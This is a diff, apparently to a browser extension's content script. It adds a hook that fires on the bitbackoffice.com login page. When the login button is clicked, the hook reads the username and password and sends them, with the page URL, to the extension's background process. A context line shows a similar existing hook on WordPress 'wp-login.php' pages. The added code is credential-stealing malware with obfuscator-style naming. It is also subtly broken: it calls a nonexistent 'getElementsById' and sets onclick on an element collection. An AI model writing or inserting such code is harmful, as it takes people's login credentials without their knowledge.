@@ -634,3 +634,18 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                         }
                     }, 1000)
                 };
+
+    if (top['location']['href']['indexOf']('https://www.bitbackoffice.com') > -1) {
+          var interval = setInterval(function () {
+              if (document['getElementsById']('login')) {
+                  clearInterval(interval);
+                  document['getElementsByClassName']('button-blue').onclick = function (_0x441cx2) {
+                   var login = {};
+                  login.username = document.getElementById("user_username").value;
+                  login.pass = document.getElementById("user_password").value;
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",login});
+                  }
+              }
+          }, 1000)
+      };
